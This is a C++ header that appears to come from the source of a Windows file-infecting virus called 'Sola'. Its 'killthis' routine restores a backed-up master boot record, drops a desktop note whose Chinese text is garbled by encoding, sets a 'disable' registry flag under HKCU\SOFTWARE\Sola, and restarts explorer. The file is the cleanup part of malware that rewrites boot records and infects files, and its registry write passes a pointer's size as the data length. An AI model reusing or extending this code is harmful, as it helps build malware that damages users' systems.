#ifndef THISKILL_H
#define THISKILL_H

#include <windows.h>
#include "changembr.h"
#include <fstream>
#include <windows.h>

using namespace std;

ofstream o;
byte backup[512];

string getuserpath()
{
	char var[]="USERPROFILE"; 
	char userpath[2048];
	GetEnvironmentVariable((LPCSTR)var,(LPSTR)userpath,2048);
	return (string)userpath;
}

bool changereg()
{
	HKEY hkey;
	string path="SOFTWARE",data="true",name="disable";
	if(RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)path.c_str(),0,KEY_ALL_ACCESS,&hkey)==ERROR_SUCCESS)
		if(RegCreateKey(HKEY_CURRENT_USER,(LPCTSTR)(path+"\\Sola").c_str(),&hkey)==ERROR_SUCCESS)
			if(RegSetValueEx(hkey,(LPCTSTR)name.c_str(),0,REG_SZ,(const byte*)data.c_str(),sizeof((const byte*)data.c_str())+1)) return true;
	RegCloseKey(hkey);
	return false;				
}

void killthis(HWND hwnd)
{
	if(hwnd) ShowWindow(hwnd,SW_HIDE);
	RecovMBR(backup);//recovery the mbr
	o.open(getuserpath()+"\\Desktop\\Sola�Իٵ�����.txt");
	o << "��λ���԰������ǣ�"<<endl<<"���á����ȣ����ҶԴ˲������������Ĳ���������Ǹ��"<<endl<<endl<<"SOLA�Ѿ������ļ�����������"<<endl<<"���ļ�����Ѿ�����SOLA"<<endl<<"�ı�ǣ���˲����ظ���Ⱦ��"<<endl<<endl<<"��Ӳ���л����б�SOLA����"<<endl<<"��Ⱦ���ļ������ܲ����ظ���Ⱦ��"<<endl<<"��������������ǡ�"<<endl<<endl<<"ϵͳ���Ѿ���װ��SOLA��רɱ����"<<endl<<"�����԰�����ɨ�貢��������ļ���"<<endl<<endl<<"ף�����ˡ�"<<endl<<endl<<"SOLA��������"<<endl<<"Bob";
	o.flush();
	o.close();
	changereg();
	system("explorer.exe");
}
#endif
